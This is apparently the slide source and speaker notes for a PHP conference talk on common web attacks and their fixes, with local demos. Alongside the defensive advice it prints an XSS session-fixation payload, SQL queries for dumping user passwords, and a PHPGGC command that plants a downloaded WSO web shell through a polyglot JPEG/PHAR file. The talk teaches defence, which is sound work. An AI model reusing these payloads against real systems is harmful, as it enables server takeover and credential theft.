class: title-slide longtitle

.conference[![](logos/%%conference%%.png)]
.introimg[![](hackthesystem/images/hack.png)]

# Hack The System
## Common ways to attack your platform

???

## BEFORE YOU START
- Is PHP server running? (php -S localhost:9999 in ~/Projects/talks/hackthesystem/laravel/public)
- Is mysql server running?

- As PHP developers, almost everything that we build is connected to the internet
- Or, to put it another way, a huge old network of people who want to break your stuff!!
- *Everyone* involved in development, from the person writing the code, to the CS team who might get the first hint that something is wrong, have a part to play.

---

class: title-slide longtitle

.conference[![](logos/%%conference%%.png)]
.introimg[![](hackthesystem/images/hack.png)]

# Hack The System
## Common ways to attack your platform


???

- Before I go on, I just want to say, it's so difficult to arrange an event like this
- Especially with the challenges of the past 2 years
- So many people are needed to make these things happens - organisers, sponsors, technical and more
- So from me, a personal thank you
- If you get an opportunity to speak to any of the organisers, let them know how much you appreciate it, and also provide feedback

- So, who am I?



---

class: section-title-c bottom left vanity-slide

.introimg[![](logos/tebex.svg)]

# Liam Wiltshire
## CTO and Head of PayOps

???

- Checkout and payments platform in the gaming space - good target for hacks!
- We do all the boring 'business' - 100 int'l payment methods, tax, compliance, AML, so our partners can focus on what they do best - making awesome games and experiences
- In my earlier career, I was described as a hacker - I was fast, and my code got the job done, but ..... maybe I wouldn't admit to having written it a month later!
- For the context of this talk however, when we refer to a 'hack' or 'hacker', we're referring to the type that is involved in system vulnerabilities, breaking into systems etc - not the developer sort! 

---

class: section-title-a center centralimage
# What This Talk Is
.highres[![](impostor/images/question.png)]

.reference[Human Vectors by Vecteezy (vecteezy.com/free-vector/human)]

???

- I'm sure some of you have been to a security talk before
- I've certainly seem some very good ones
- So you might be wondering "What's Special About This Talk"

---
class: section-title-a centralimage
# What This Talk Is

- How to think about attacks
- Attacks I've seen in the real world
- Things that are likely to be in your codebase
- Things that can be fixed quickly
- Tools that you can use yourself

???

- The aim of this talk isn't necessarily to show off the newest, craziest attacks - there isn't a 'mic drop moment' - instead this is designed to provide real-world help to real-world problems
    - We're going to look at the sorts of vulnerabilities that could well be in your system, and the sorts of attacks that an average organisation might see, and how to deal with them
- The reason I'm here is to help you find vulnerabilities in your own systems, and to help you know what to do when you find one (or have one reported to you)
    - In order to do this, it's often helpful to think like a hacker.
---

class: section-title-b center centralimage

# What are Attacks Intended For?
.highres[![](hackthesystem/images/whyhack.png)]

.reference[Technology vector created by macrovector (freepik.com/vectors/technology)]

???

- To start to identify likely vectors, it's useful to think about _why_ a hacker might attack a system.
- After all, a hacker is unlikely to waste time trying to find a way into a particular part of the system if it's not worthwhile for them
    - So what are some reasons a hacker might attack a system?

---

class: content-even

# Take Down A System

- For profit or for fun
- Is likely to target parts of the system that can cause network or hardware disruption
 - CPU or network expensive activities
 - Self-replicating activities (fork bomb)

???

- An attacker might try to take down a system for profit
    - Profit could be ransom
    - It could also be a DDOS service that is being purchased by someone else
    - If this is the case, they are going to look for ways to make the most impact with the least effort
        - DDOS to chew up network (not strictly hacking, but is still an attack)
        - Something that will cause loss of service by chewing up CPU - an expensive action
            - Ideally something that will self replicate - if they can trick an action into keep spawning new processes, then the server will become unavailable very quickly
- If an attack is for fun, then it's likely to be against an easier target

---

class: content-odd

# Gain Access To Data

- Data is valuable
 - Personal data can be resold
- You might not think the data you have is valuable
 - Could it be combined with other data?

???

- Data is valuable - this doesn't have to be login data.
- You might think the data you have isn't worthwhile, but what if that data was combined with other sources?
    - Imagine you had a service that allowed you to send yourself birthday reminders
        - Those dates might be 'memorable details' associated with that email address on another system (or a PIN etc)

---

class: content-even

# Promoting Skills and Software

- Some attacks can be a 'billboard' to advertise the attackers skills, services or software
- Attacks will be promoted on hacker forums
- A DDOS service might launch attacks to demonstrate the power of their network, in order to gain customers

???

- Some attacks might just be for the purpose of promoting a hackers skills, or a service they run or software they've built
    If this is the case it's going to be against a notable entity - maybe not a facebook-level site, but at least an entity well known within a particular industry

---
class: content-odd

# Because It's Easy

- Attackers will use tools to automate as much as possible
- This might include scanners that look for known vulnerabilities in re-used code 

???

- Attackers are generally not developers
   - They can (and will) write code, but they don't want to. As such they will look to automate and use tools as much as possible
- (frameworks, CMSes, libraries etc)
- Most of these are combated by keeping third party code, libraries etc up to date
- Others are the sorts of attacks we'll talk about in 'level 1'

---

class: section-title-b center centralimage

# Classifying Security Vulnerabilities
.highres[![](hackthesystem/images/brain.png)]

.reference[Human Vectors by Vecteezy (vecteezy.com/free-vector/human)]

???

- Tebex, for a while, ran a bug bounty programme
- Thought we might get 1 or 2 reports - we were pretty confident in our skills and abilities
 - On day 1, we received over 50 reports!
- However, most of these were either invalid, or didn't pose any risk at all
 - Even the ones that were valid and we did action wouldn't exactly be considered high-priority.
- So how do you quantify how 'bad' a particular vulnerability is?

---

class: content-even halfhalf middle

# Vulnerability
# Rating
# Taxonomy

.right[![](hackthesystem/images/vrt.png)]

.reference[Bugcrowd (bugcrowd.com/vulnerability-rating-taxonomy)]

???

- VRT is a resource that outlines baseline priority ratings for common vulnerabilities
 - Was originally designed by Bugcrowd to assist bug hunters and Bugcrowd's triagers to assign severity to vulnerabilities 
- Examples:

---
class: content-even middle


- P1: Broken Authentication and Session Management >> Authentication Bypass
- P2: Application-Level Denial-of-Service (DoS) >> Critical Impact and/or Easy Difficulty
- P3: Broken Authentication and Session Management >> Session Fixation >> Remote Attack Vector
- P4: Server Security Misconfiguration >> No Rate Limiting on Form >> Email-Triggering


.reference[Bugcrowd (bugcrowd.com/vulnerability-rating-taxonomy)]

???

- The lower the 'P' score, the more critical
  - Takes into consideration how big an impact the attack could have, as well as how easy it would be to do

---

class: content-odd

# Risk Impact Matrix

![](hackthesystem/images/riskimpact.png)

???

- Another way to assess is with a risk-impact matrix
_ Here you assess the probability of a given exploit being used (consider how easy it is and how readily discoverable it is) and the impact
   - Something that would be difficult to exploit and would (for example) only result in some emails being sent would likely be 'Very Low'
   - whereas the ability to bypass authentication using a query string that gave full admin access to all your customer a would be Critical!

---

class: section-title-c center centralimage

# To Battle!
.highres[![](hackthesystem/images/battle.png)]

.reference[Human Vectors by Vecteezy (vecteezy.com/free-vector/human)]

???

- Let's be honest - when you came to this talk you probably wanted to see some attacks in action right
- So let's get on with it!
- We're going to look at 3 'levels'
     - Level 1: some really simple potential vulnerabilities - small in scope but very easy
     - Level 2: Some that are potentially more damaging, and still fairly easy - these might be your 'high' impact ones
     - Level 3: Some that potentially give up full access to everything, but are more unlikely and harder to pull off

---

class: section-title-c center middle

# Level 1

???

---

class: content-even noheader tinycode

```twig
<table>
  <thead><tr><th>Name</th><th>Price</th><th></th></tr></thead>
  <tbody>
    {% for product in products %}
        <tr>
          <td>{{ product.name }}</td>
          <td>${{ product.price|number_format(2) }}</td>
          <td>
            <a href='{{ path("product_edit", {id: product.id}) }}'
               class='btn btn-success'>Edit</a>
            <a href='{{ path("product_delete", {id: product.id}) }}'
               class='btn btn-danger'>Delete</a>
          </td>
        </tr>
    {% endfor %}
  </tbody>
</table>
```

???

- Who has ever seen (or written) code like this before? I'm sure most of us have - I have
    - Seems fairly innocent, presumably the user has logged in and they're seeing a list of their products that they can edit or delete
- I'm sure a number of you have seen the problem with this

---
class: content-even noheader tinycode

```twig
<table>
  <thead><tr><th>Name</th><th>Price</th><th></th></tr></thead>
  <tbody>
    {% for product in products %}
        <tr>
          <td>{{ product.name }}</td>
          <td>${{ product.price|number_format(2) }}</td>
          <td>
            <a href='{{ path("product_edit", {id: product.id}) }}'
               class='btn btn-success'>Edit</a>
*            <a href='{{ path("product_delete", {id: product.id}) }}'
*               class='btn btn-danger'>Delete</a>
          </td>
        </tr>
    {% endfor %}
  </tbody>
</table>
```

???

- The delete is just a regular link - this means that it's going to be triggered by a GET request
    - If we have a fairly large community of users, and many of them know each other or hang out in shared discord, tweet each other etc
- You could create URLs that you send to others (presumably using a shortener to hide what it's linking to) - and if they click on them, and they're logged in (which they probably are), that's going to immediately go to the delete page 
    - If you've got a confirmation step then great, but if not that product is now gone!
- In short, any action (anything where the user _does_ something) should be a POST request (in other words, a form), and should use CSRF tokens

---

class: content-odd

# 2FA

- 2FA is great
- Who here works on an app or website that implements time-based 2FA?
- What size is your window?

???

- In my opinion, 2FA should be mandatory on every site, although I do understand the commercial realities between putting off non-tech-savvy users and doing everything perfectly!
- Who here implements a time-based OTP (Google Auth, Authy)?
- How big is your 'window'? 2 minutes? 5 minutes?

---

class: content-odd
# 2FA 

- 5 minute window (in each direction) = 20 valid OTPs
- Total possible OTPs = 1,000,000 - 1 in 50,000
- On average, you'd need 25,000 guesses to find a valid OTP
- 2,500 requests a minute - not that many!

???
- If you have a 5 minute window....
    - Talk through the maths
- This is slightly simplified, as during that 10 minutes obviously some of those codes would no longer be valid and some that potentially were already tested would become valid
    - However, the principle is that an insecurely implemented 2FA gives a false sense of security

---
class: content-odd

# 2FA

- Use rate-limiting
 - However, rate-limiting on IP (as is provided by services such as CloudFlare) isn't enough
 - Attacker could use many IPs, and share the session cookie between the instances to try lots of OTPs and bypass limits
- Rate-limiting needs to be against the account in question

???

- The simple answer to this is to use rate limiting.
    - When we usually talk about rate limiting, we are referring to IP-based rate limiting. The sort of thing that services like CF might provide at a network level
- In this instance that doesn't work - if an attacker is in control of a botnet with a large number of IPs, they can share the session between the network, and bypass any IP-level rate limits to try lots of OTPs
- In this situation, the rate limit should be against the account - so when a user logs in they only have a certain number of 2FA attempts before a cooldown kicks in

---
class: content-even

# What Do You Suggest?

- If someone sees a login that they don't recognise, what do we usually suggest?
- Password/2FA resetting
 - But is that enough?
 - What do you do with any existing sessions?

???

- The standard answer is to reset your password and enable 2FA
- I've seen plenty of applications where changing your password (both through forgotten password and profile editing) either:
    - Doesn't log anyone out - you can carry on doing whatever you are doing 
    - Only logs you out - doesn't expire any other sessions (so in Laravel terms might call `Auth::logout()`)
    
- If an attacker is already in your account, then changing your password (or 2FA for that matter) doesn't make a difference
- Whenever any authentication details change (email address, password or 2FA) - _all_ sessions that are logged in as that user should be expired

---
class: content-odd middle center

## http<i></i>s://site.com/login/?return=
## https%3A%2F%site.com%2Fproducts

???
- Who has see a link like this before?
    - Fairly common - control where we will be sent back to after logging in (or performing some other action)
- A link like this can be used to gain a users' trust, and then exploit that trust to obtain information from the user

---
class: content-odd middle center

## http<i></i>s://site.com/login/?return=
## **https%3A%2F%badsite.com%2Frelogin**

???

- Imaging the URL was changed to this. The user, like we tell them to, checked the URL contained site.com - they did everything they should
- Who re-checks the URL _after_ they're redirected? They know they logged in on the correct URL!
    - That badsite.com could ask them to re-login, or confirm their 2FA or any other number of actions that could then be used to compromise their data
    - If it looks like the original site, the user will probably never suspect a thing!

---

class: content-odd

# Open Redirect
- This is called an open redirect - the redirect can be changed to send the user wherever the attacker wants
 - Restrict redirect to just this domain
 - Created signed redirect URLs that cannot be changed/spoofed
 - Only allow redirects to a pre-defined list of allowed URLs

???

- Open redirects are not a security vulnerability in themselves - they do not leak data or cause problems
    - However they can give the user trust of confidence that can then be exploited
- Various solutions exists
    - Restricting redirects to just the domain in question is one option - however if you have GET-based actions as we described before, that's still a potential risk
    - Create signed URLs, so the redirect URL comes with a signature that is verified before the redirect happens - this still allows for external redirects when required, but provides confidence that the links are approved
      - This is something that Tebex does, as we have to perform external redirects

---

class: section-title-c center middle

# Level 2

???

- So we've been through some basic vulnerabilities - in scope they're all fairly small, but quite common
    - perhaps some of you are thinking to your own codebases and realising that some of them exist
- The good news is that they're all simple to fix!
- Now we're going to look at a few vulnerabilities that could have wider impacts

---
class: content-odd center

# SQL Injection


???

- No security talk would be complete without a mention of SQL injection.
 - However, the common argument I hear is:

---
class: content-odd center

# SQL Injection

![](hackthesystem/images/angry.png)

.reference[Human Vectors by Vecteezy (vecteezy.com/free-vector/human)]

???

- "Everyone uses an ORM these days - SQL injection isn't really a thing anymore" - and most of the time you'd be right
    - However, I'll be the first to admit that sometimes I can be lazy - and the complicated, abstracted codebases we work on can hide potential gotchas

---
class: content-odd

```php
class emailStats {
  public function complicatedAnalyticsCall(string $email) {
      return DB::select(
        "SELECT COUNT(1) FROM payments p " .
        "FORCE INDEX (payments_email_status_idx) " .
        "INNER JOIN accounts a ON p.account_id = a.id " .
        "WHERE some complicated, expensive statement " .
        "AND p.email = '$email'"
      );
  }
}
```

???

- Have you ever written a query by hand, because the SQL generated by your ORM was dog slow? I have
- In this instance we _should_ use prepared statements, but I'd guess that it's not always done
- In this instance, perhaps you _know_ that the email address is coming from the database, so you trust the data
    - But someone else might not realise that - what if this function is re-used by another developer down the line, but now they're passing in an email address provided by a user?

---

class: content-odd

# sqlmap

- Manually finding and exploiting a vulnerability would be very difficult
- sqlmap automates the process - simply provide a URL that _could_ have vulnerable params, and it'll do everything else 

???

- Even if we do have a vulnerable param in our code, it's easy to think it would be difficult (if not impossible) to exploit
    - You might try to exploit it manually, and conclude that you can't get any information out
- But there are tools that will do the work for us
    - sqlmap is a common tool used for finding and exploiting vulnerable params for mysql injection

---

class: content-odd center middle

# DEMO

???

- Show example code
- http://localhost:9999/mysql?title=pride&year=1810
- ./sqlmapdemo.sh
- SELECT TABLE_SCHEMA, TABLE_NAME FROM information_schema.TABLES
- SELECT email, passowrd FROM hackme.users;

---
class: content-odd

# SQL Injection

- **Always** use prepared statements
- Assume that _all_ data could be coming from a user   
- Remember, tools exist to maximise the potential of the smallest possible vulnerability

???

- For most attacks, there is one key mantra
  - Never trust user input. EVER!!
- On top of that, when dealing with databases, always use prepared statements if you are writing raw queries
- In case you are wondering, there are such things as NoSQL injections, so if you are using NoSQL databases, you should definitely look into that too!

---
class: content-even tinycode

# Logic-Based Timing Attacks

```php
$user = User::where('email', $email)->first();

if (!$user) {
    return redirect()->back()->withError(
        ['email' => 'Invalid login']
    );
}

if (!password_verify($password, $user->password)) {
    return redirect()->back()->withError(
        ['email' => 'Invalid login']
    );
}
```

???

- Nothing in an application runs in isolation - everything has an impact on something else, which can often be measured 
- This is a fairly standarrd piece of code to check if a user can login
  - Imagine you want to find out which email addresses exist on a platform, but you don't have DB access
- In this code, we've actually thought about security...

---
class: content-even tinycode

# Logic-Based Timing Attacks

```php
$user = User::where('email', $email)->first();

if (!$user) {
    return redirect()->back()->withError(
*        ['email' => 'Invalid login']
    );
}

if (!password_verify($password, $user->password)) {
    return redirect()->back()->withError(
*        ['email' => 'Invalid login']
    );
}
```

???

- We return the same error for either no user found or no password, so an attacker can't see if the email exists or not based on the message
- But is there another way of getting that information?
- In this code, password_verify takes an additional nonzero amount of time to run - so any time there is a matching email address, regardless of if the password is right or not, it will take longer
    - In order to do this accurately you need to run it a large number of times, to average out network latency etc, but it's entirely possible to do

---
class: content-even noheader tinycode nudgeup

```php
$users = [
    'liam@tebex.co.uk' => password_hash('testtest123', PASSWORD_DEFAULT),
    'liam@w.iltshi.re' => password_hash('testtest123', PASSWORD_DEFAULT),
];
$tests = ['nouser@test.com', 'liam@tebex.co.uk', 'anothernonuser@example.com']; $times = [];

foreach ($tests as $test) {
    $times[$test] = 0; $x = 1;
    
    while ($x <= 10) {
        $start = microtime(true);   //Get the start time
        usleep(rand(10000,99999));  //Simulate jitter - will average out
        
        $user = $users[$test] ?? false; //Check if the user exists
        if ($user) { password_verify('aksjdhkasjdh81', $user); }
        
        $times[$test] += (microtime(true) - $start); $x++;
    }
    $times[$test] /= 10;
}
```

???

- Apologies for the formatting - trying to get it on one slide!
- Explain what the code does
 - Not a completely representative test as we're pulling the records from an array
 - We are adding a usleep to simulate network etc - between 10 and 100 ms - the point being that the 'jitter' will average out!

---

class: content-even

```php
array(3) {
  'nouser@test.com' => double(0.040307402610779)
  
  'liam@tebex.co.uk' => double(0.10314846038818)
  
  'anothernonuser@example.com' => double(0.067523074150085)
}
```

???

- You can see that the valid user took a clearly detectable amount of additional time
 - In the real world, in order to average around network lag, DB query variation etc you'd need to run the query significantly more than 10 times, but that's entirely possible!

---
class: content-even

# Timing Attacks

- Rate Limit
  - Requiring attackers to use a network of different devices, from different countries makes it significantly harder to filter out the noise
- Fixed execution time functions
 
???

- As we've touched upon before, many large botnets have thousands of IPs - so they can work around the rate limit
    - however the likelihood is those different connections will be in different locations, different types of devices - IP cameras, doorbells etc, have different latency, making averaging out the variability much harder
    - And if it's not worth the attackers time, they'll move on
- Fixed execution time - forcing a function to run for a specific amount of time is a double-edged sword
  - on the one hand it can work, however, if you set it too short then it won't make all calls last the same amount of time, and if you set it too long you are making users wait unnecessarily. 

---

class: content-odd nudgeup tinycode

# Session Fixation

- Session fixation is when an attacker tricks a victim into using a session they've already created
- In the bad old days, `?PHPSESSID=xxxx` was a pretty easy way to get a victim to use your session
- However it's still possible now:

```php
http://yoursite.com/page.php
 ↳ ?q=<script>document.cookie=
 ↳ "PHPSESSID=qvidf3pweno6c12whk3hk26oxs0hjke0";</script>
```

???

- Session fixation is tricking a user into using a known session (that the attacker controls). The idea is that, if the user logs in using that session, the hacker than then use that same session key to gain access to the users account
- Once upon a time, it was fairly common to see ?PHPSESSSID= as a query string param, passing sessions IDS around - obviously made it very easy to trick a user into using your session
    - Thankfully, that's almost completely unheard of today!
- However, that doesn't mean there are not other ways - consider this URL.
  - Again, the potential weakness is invalidated user input - imagine this `q` param is being output to the page
  - Perhaps you thought (as I have before) "well, if the user puts something in that query string, they're only breaking their own experience"
  - But, if this link is provided to someone and they don't check it (let's be honest, alot of users wouldn't understand what that ?q= does anyway), that javascript could be output to the page, setting the session in a cookie

---
class: content-odd

# Session Fixation
- **Never** trust user input!
- Regenerate sessions on any session-changing action, especially login
 - Setting a new session ID for the now logged in user means the old session ID (that the attacker has, is still not logged in)

???

- Again, _never_ trust user input - you'll hear my say this alot!!
- In addition, it's good practise to re-generate sessions whenever a session-changing action (particularly login, but potentially other actions as well) takes place
  - That way, even if the user _was_ using a fixed session, they will be given a new one _before_ the login takes place, to the fixed session still doesn't have a user against it

---

class: section-title-a center middle

# Level 3

???

- Now we're going to look at an attack (and some variations to consider) that could in theory allow an attacker to gain full access to your system
 - They are definitely more difficult to pull off, and with some basic validation are prevented, but this is the sort of thing that is possible if you don't account for every piece of data

---

class: content-even center centralimage

# Remote Code Execution (RCE)

.highres[![](hackthesystem/images/rce.png)]

.reference[Technology vector created by macrovector (freepik.com/vectors/technology)]

???

- RCEs are the nightmare we hope we don't have to face - where an attacker can get our application (or server) to run code they want it to
 - Once the attacker can run one piece of code, it's likely they can use that to give themselves greater access to allow them to run further commands, download sensitive data, potentially even make changes to the application

---
class: content-even

# Remote Code Execution (RCE)

- RCEs can happen in a variety of ways, such as:
 - Supply Chain Attacks
 - Software design flaws (OS, stack software)
 - Dynamic code execution/injection

???

- There are lots of ways that an RCE can happen
  - it could be by using an infected third party library - a "supply chain attack"
    - (such as incidents over the past few years with the event-stream npm package and various wordpress plugins that have been purchased by bad actors to inject spam into hundreds of thousands of sites)
  - Also, human error in software that we use
    - There have been numerous potential RCE vectors in software including openssl, apache, nginx and PHP
- For both of these, keeping your libraries and other software you use up to date is your main defense, as well as monitoring security advisories
   - For PHP specifically, Roave have a composer package that deals with alot of this, and if you are using private packagist they will send you advisories on packages you have installed
   - Other languages and package managers have other ways of doing it, such as `npm audit`
- So we're going to look one way of performing dynamic code execution, or tricking your application into running code provided by an attacker

---
class: content-even

# serialize() / unserialize()

- `serialize()` returns a string containing a byte-stream representation of any value that can be stored in PHP.
- `unserialize()` can use this string to recreate the original variable values.
 - This includes objects

???

- In PHP, serialize and unserialize are super useful functions that allow us to convert variables into strings, then re-hydrate them back into variables
- This includes the ability to convert objects into strings and back again
  - The object itself isn't turned into a string (so the string doesn't contain references to the objects methods etc), but when `unserialize` is called, effectively it creates an instance of that object, and pushes the properties to it
- Used in all sorts of frameworks and libraries, such as Laravel for jobs

---

class: content-even tinycode

# unserialize()

```php
class SaasCompiler
{
    private $cacheFile;
    private $compiledSass = '';
    
    public function getSass(): string
    {
        return $this->compiledSass;
    }
    
    public function __wakeup()
    {
        $this->compiledSass = file_get_contents($this->cacheFile);
    }
}
```

???

- When an object is unserialized, PHP will check for the existence of a `__wakeup()` or `__unserialize()` function, and will run them
  - In poorly designed code, this can lead to remote code being executed
- So, consider if an attacker can create a serialized string that represents this SassCompiler class:
   - we could set `cacheFile` to something malicious - say the config file or passwd file 
   - Then on wakeup it would grab that file and assign it to compiledSass, which is presumably going to be output somewhere
   - Obviously this could be bad!
- In theory, _any_ function call that uses information taken from the serialized class could be exploited (since the real weakness is the fact the serialized properties were polluted), but in most situations it's methods that are called automatically, including `__destruct()`, `__toString()` etc

---
class: content-even

# How Bad Can It Be?

- Guessing at every possible serialized object that _might_ have a vulnerable `__destruct()` or `__wakeup()` isn't practical
- But what about commonly used code? PHP libraries that are installed on thousands of codebases?
 - Trying to create these exploits manually would be a huge amount of work
 - Thankfully (for them), they don't need to!

???

- Now, in reality, an attacker isn't going to try to 'guess' at completely unknown classes that _might_ be able to be exploited
  - Wouldn't make sense from a cost/benefit point of view
- Knowing the source code makes this much easier - and with open source libraries that are installed on thousands of applications, that is a good potential source of vectors
  - Even better for the attackers, there are tools that will do most of the work for them!


---
class: content-odd

# PHPGGC

- PHP Generic Gadget Chains is a library of payloads that exploit known vulnerable `unserialize()` calls
- Covers well known frameworks and libraries such as Laravel, Guzzle, Wordpress, Monolog and more
- Will also generate payloads for you to use in an attack

---

class: section-title-b center middle

# DEMO

???

- Show example code
- ./rcedemo.sh
- http://localhost:9999/rce/payload
- http://localhost:9999/passwd

---

class: content-odd center

.highres[![](hackthesystem/images/bank.png)]

???

- And the hacker is taking your vulnerability all the way to the bank!
- Let's be realistic for a second - no-one is going to accept a random text file uploaded by a user, then call unserialize on it's contents
  - So, is this really a problem?

---

class: content-odd center

.highres[![](hackthesystem/images/idea.png)]

???

- But they're ahead of you!

---

class: content-even

# Polyglot JPEG/PHAR files
.small[
- Within PHP, there is a `phar://` stream wrapper - this will tell PHP to treat the file as a PHP archive.
  - When the phar file is loaded, the metadata within the phar manifest is `unserialize`d
- At the same time, you can hide a phar file within a jpeg
- The phar load / unserialize step can happen on more or less any file-based function - including some you might innocently use to validate the file itself!
 - `file`, `file_exists`, `filesize`, `is_dir` and more
]
???

- For mostly time reasons (and the fact it gets very complicated and makes my head explode!), we can't go into the minute detail of how this works, however
    - PHP has various wrappers such as php://input or php://memory that you might have used before
    - There is also one called phar:// that tells PHP to treat the file as a phar archive.
    - At the same time, you can hide a phar within a jpeg.
    - What get really interesting however, is when you realise that within the manifest of a phar file, can be a metadata object
      - This metadata object is a serialized PHP object....
- So, remember that the exploit involves polluting a serialized object with specific data, that we then want PHP to unserialize? 
    - Well, when most file-based actions are performed on a phar file, that serialized metadata is unserialized!
- And we can hide the phar fie in a JPEG, so it looks legitimate...

---

class: section-title-c center middle

# DEMO

???

- Show example code
- cd /home/liam/Projects/talks/hackthesystem/tools/phpggc
- ./phpggc -pj avatar.jpg Monolog/RCE1 system "wget https://raw.githubusercontent.com/mIcHyAmRaNe/wso-webshell/master/wso.php -O wso.php" -o loaded-mono.jpg
- mv loaded-mono.jpg ../../laravel/app/Http/Controllers/
- http://localhost:9999/image?filename=phar://loaded-mono.jpg
- http://localhost:9999/wso.php
- PW ghost287

---

class: content-even

# Polyglot JPEG/PHAR files

- This still requires trusting user input, in that the system needs to be tricked into using the `phar://` wrapper
- So, yet again **never trust user input!**
- Bear in mind this might not be on a user request - if you have scheduled tasks this could be an attack vector as well
 - **Never** run scheduled tasks as root!

???

- Again, there is a reliance here on a piece of user information - unless we tell php it's an archive using the phar:// wrapper, which came from the user-provided query string, we wouldn't be able to exploit that.
- But, the potentially is pretty bad - now, consider how it could get worse!
  - Imagine you have an app that uploads an image and saves the filename, then later on that image is processed by a scheduled task.
    - Perhaps you didn't write the original code that adds the image to the database - do you know if it was validated? Perhaps it wasn't, and now the filename in the DB is phar:// something?
  - Now, who here has ever run a cron job as root? (raise hand)
  - You've just given full root access to your attacker!

---

class: content-odd

# Tools

- sqlmap: https://sqlmap.org/
- PHPGGC: https://github.com/ambionics/phpggc
- Metasploit: https://www.metasploit.com/
- BurpSuite: https://portswigger.net/burp

???

- We're very much at the end of our time now, but I just wanted to flag a few tools that might be useful if you are trying to test out your own applications: 
  - We've used sqlmap and PHPGGC in this talk
  - Metasploit, is a pen testing tool that can be used to automate thousands of potential attack vectors
  - Burpsuite which is another pen testing tool, and includes a proxy tool that allows you to intercept, modify and resend (and bulk-repeat) HTTP requests on the fly to try different attack vectors
    - such as testing if submitting lots of OTPs will get you rate limited! 

---
class: summary-slide

- Hacking and security will always be part of development
- "Completely Secure" isn't possible - our aim is to make it as secure as possible, and make it difficult enough for attackers that it's not worth their time
- Human error is always part of the attack vector
 - Think like an attacker when reading or reviewing code
 - Assume your users will make mistakes, and ensure you are protecting them

???
- Hacking and security will always be part of development
   - it's a cat-and-mouse game - we'll keep making applications more secure, and the attackers will keep devising new ways to get in
- "Completely Secure" isn't possible - our aim is to make it as secure as possible, and make it difficult enough for attackers that it's not worth their time
   - The reality is that no system is 100% secure - but hacking is a business and if the reward isn't worth the time and effort required, then an attacker will look for one that is 
- Human error is always part of the attack vector
   - Human error could be us as developers, it could be our supply chain, or it could be users - try to think about all the potential ways the human error could leave a way in, and what you can do to mitigate it
- Think like an attacker when reading or reviewing code
   - Remember, an attacker isn't going to manually try to exploit that vulnerable parameter - they'll use tools to make their life easier, so use the tools first before a hacker can get to it
- Assume your users will make mistakes, and ensure you are protecting them
   - There are ways that we can defend against mistakes our users might make - user's can be expected to understand what every URL does, and we have to assume they will click that link that their 'friend' sent them, so let's ensure the opportunity for something bad to happen isn't there
- To finish, I want to leave you with this quote:

---
class: summary-slide middle

> _“The only truly secure system is one that is powered off, cast in a block of concrete and sealed in a lead-lined room with armed guards — and even then I have my doubts.”_

.right[Gene Spafford]

???

- “The only truly secure system is one that is powered off, cast in a block of concrete and sealed in a lead-lined room with armed guards — and even then I have my doubts.”
- So, good luck!.... and ....


---


class: thanks-slide

.conference[![](logos/%%conference%%.png)]
.introimg[![](http://tebex.co.uk/img/tebex.svg)]

# Thank You

### %%joindin%%
### Liam Wiltshire
### @l_wiltshire
### liam@tebex.co.uk
